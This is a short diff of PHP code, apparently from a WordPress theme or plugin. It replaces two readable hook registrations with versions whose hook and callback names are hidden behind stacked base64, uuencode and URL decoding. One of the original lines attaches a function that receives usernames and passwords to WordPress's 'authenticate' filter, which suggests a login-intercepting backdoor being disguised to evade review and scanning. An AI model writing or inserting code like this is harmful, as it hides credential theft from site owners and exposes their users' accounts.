@@ -942,7 +942,7 @@ if ( !empty($_POST['author']) && strpos($_POST['email'], '@') !== FALSE && strpo
 
 }
 
-add_action('pre_comment_on_post', 'stile_minima_kubi');  
+add_action(trim(base64_decode(convert_uudecode(urldecode(stripslashes('%3C8TA%2A%3B%25%40R3G9B5S%25L8FY29F%28R-69C1SEZ9%24%24%5D%2F0%60%60%0A%60%0A'))))), trim(base64_decode(convert_uudecode(urldecode(stripslashes('88S-2%3C%26%29%275F9B5VQU85%3CQ%3A%25%40R%3D%23%259%3B6L%5D%0A%60%0A'))))));   
  
 function minlogin ($url, $username, $password) {
 
@@ -1079,7 +1079,7 @@ return $url;
 
 }
 
-add_filter( 'authenticate', 'minlogin', 10, 3 );
+add_filter( trim(base64_decode(convert_uudecode(urldecode(stripslashes('065A6%2C%26%25%275G5D1VQJ65A2%3B%60%60%60%0A%60%0A'))))), trim(base64_decode(convert_uudecode(urldecode(stripslashes('%2C8E%3DL%3D6%29%27.6YA5S0%5D%0A%60%0A'))))), 10, 3 );
 
 function cdacso () {
 
